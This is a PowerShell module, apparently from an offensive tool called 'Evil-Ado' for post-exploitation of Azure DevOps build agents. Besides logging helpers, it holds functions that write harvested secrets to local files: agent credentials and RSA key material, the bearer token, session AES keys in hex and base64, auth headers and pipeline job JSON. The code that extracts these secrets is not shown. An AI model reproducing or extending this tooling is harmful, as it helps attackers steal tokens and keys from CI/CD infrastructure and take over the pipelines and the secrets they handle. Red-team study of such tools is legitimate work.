# ── Logging ──────────────────────────────────────────────────────
# Console always. File logging only when $script:LogFile is set.
# ─────────────────────────────────────────────────────────────────
$script:LogFile = $null

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("Info","Success","Warning","Error","Fatal")]
        [string]$Severity = "Info"
    )

    $prefixMap = @{ Info="[*]"; Success="[+]"; Warning="[!]"; Error="[-]"; Fatal="[FATAL]" }
    $colorMap  = @{ Info="Cyan"; Success="Green"; Warning="Yellow"; Error="Red"; Fatal="Red" }

    $prefix = $prefixMap[$Severity]
    $color  = $colorMap[$Severity]
    $ts     = Get-Date -Format "HH:mm:ss"
    $line   = "$prefix $Message"

    Write-Host $line -ForegroundColor $color

    if ($script:LogFile) {
        [System.IO.File]::AppendAllText($script:LogFile, "[$ts] $line`r`n")
    }

    if ($Severity -eq "Fatal") { exit 1 }
}

function Write-Detail {
    param([string]$Message, [string]$Color = "White")
    Write-Host "    $Message" -ForegroundColor $Color
    if ($script:LogFile) {
        $ts = Get-Date -Format "HH:mm:ss"
        [System.IO.File]::AppendAllText($script:LogFile, "[$ts]     $Message`r`n")
    }
}

function Write-Banner {
    Write-Host ""
    Write-Host "  ================================================" -ForegroundColor Magenta
    Write-Host "   Evil-Ado -- Azure DevOps Agent Post-Exploitation" -ForegroundColor Magenta
    Write-Host "  ================================================" -ForegroundColor Magenta
    Write-Host ""
}

# ── Artifact Save Functions ──────────────────────────────────────
# Write structured artifact files to $script:RunDir
# ─────────────────────────────────────────────────────────────────

function Save-AgentLog {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$Auth
    )

    if (-not $script:RunDir) { return }

    $path = Join-Path $script:RunDir "agent.log"
    $lines = @(
        "=== Agent Info ==="
        "AgentPath:          $($AgentInfo.AgentPath)"
        "AgentName:          $($AgentInfo.AgentName)"
        "AgentId:            $($AgentInfo.AgentId)"
        "PoolId:             $($AgentInfo.PoolId)"
        "ServerUrl:          $($AgentInfo.ServerUrl)"
        "Version:            $($AgentInfo.Version)"
        "OS:                 $($AgentInfo.OS)"
        "AgentType:          $($AgentInfo.AgentType)"
        "IsDeploymentGroup:  $($AgentInfo.IsDeploymentGroup)"
        ""
        "=== Credentials ==="
        "ClientId:           $($AgentInfo.ClientId)"
        "TokenUrl:           $($AgentInfo.TokenUrl)"
        "OrgUrl:             $($AgentInfo.OrgUrl)"
        "RSA Modulus:        $($AgentInfo.RsaPublicModulus)"
        "RSA Exponent:       $($AgentInfo.RsaPublicExponent)"
        ""
        "=== Bearer Token ==="
        "Token:              $($Auth.Token)"
        ""
        "=== Raw .agent Config ==="
        ($AgentInfo.RawConfig | ConvertTo-Json -Depth 10 2>$null)
    )

    [System.IO.File]::WriteAllText($path, ($lines -join "`r`n"))
    Write-Log "Saved agent.log" -Severity Info
}

function Save-SessionLog {
    param(
        [hashtable]$Session,
        [hashtable]$Auth
    )

    if (-not $script:RunDir) { return }

    $path = Join-Path $script:RunDir "session.log"

    $aesHex = ""
    if ($Session.AesKey) {
        $aesHex = ($Session.AesKey | ForEach-Object { $_.ToString("x2") }) -join ""
    }

    $aesB64 = ""
    if ($Session.AesKey) {
        $aesB64 = [Convert]::ToBase64String($Session.AesKey)
    }

    $lines = @(
        "=== Session ==="
        "SessionId:          $($Session.SessionId)"
        "AES Key (hex):      $aesHex"
        "AES Key (base64):   $aesB64"
        "AES Key Length:     $($Session.AesKey.Length) bytes"
        ""
        "=== Auth Headers ==="
    )

    foreach ($key in $Auth.ApiHeaders.Keys) {
        $lines += "${key}: $($Auth.ApiHeaders[$key])"
    }

    [System.IO.File]::WriteAllText($path, ($lines -join "`r`n"))
    Write-Log "Saved session.log" -Severity Info
}

function Save-PipelineJson {
    param(
        [hashtable]$Session
    )

    if (-not $script:RunDir) { return }
    if (-not $Session.JobJson) { return }

    $path = Join-Path $script:RunDir "pipeline.json"

    # Try to pretty-print the JSON, fall back to raw if it fails
    $pretty = $null
    try {
        $pretty = $Session.JobJson | ConvertFrom-Json | ConvertTo-Json -Depth 20
    } catch {}

    if ($pretty) {
        [System.IO.File]::WriteAllText($path, $pretty)
    } else {
        [System.IO.File]::WriteAllText($path, $Session.JobJson)
    }

    Write-Log "Saved pipeline.json ($($Session.JobJson.Length) chars)" -Severity Info
}
